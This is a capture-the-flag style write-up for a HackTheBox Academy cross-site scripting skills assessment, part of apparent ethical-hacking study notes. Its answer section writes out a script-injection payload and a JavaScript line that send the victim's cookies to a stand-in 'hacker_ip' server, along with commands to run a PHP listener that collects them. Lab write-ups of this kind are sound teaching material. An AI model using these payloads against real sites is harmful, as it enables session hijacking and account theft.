We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`.
In our Web Application Penetration Testing plan, we reached the part 
where you must test the web application against Cross-Site Scripting 
vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

## Questions:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag.**Answers:**

## Answers:
### First, let's create a server on our machine and prepare a payload for testing input fields on the target site.
```mkdir /tmp/tmpserver```

```cd /tmp/tmpserver```

```nano myscript.js > new Image().src='http://hacker_ip:3333/index.php?c='+document.cookie;```

```nano index.php```

<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-code.png" >

## Let's start your server

```sudo php -S 0.0.0.0:3333```

### Now let's test the input fields on the target site:

```"><script src=http://hacker_ip:3333/myscript.js></script>```


<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png" >
<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png" >

### Great, it works!

### Let's check our cookie file.

<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png" >

## Happy Hacking!

[My HTB Academy unique referral link >](https://referral.hackthebox.com/mzyGKZb)


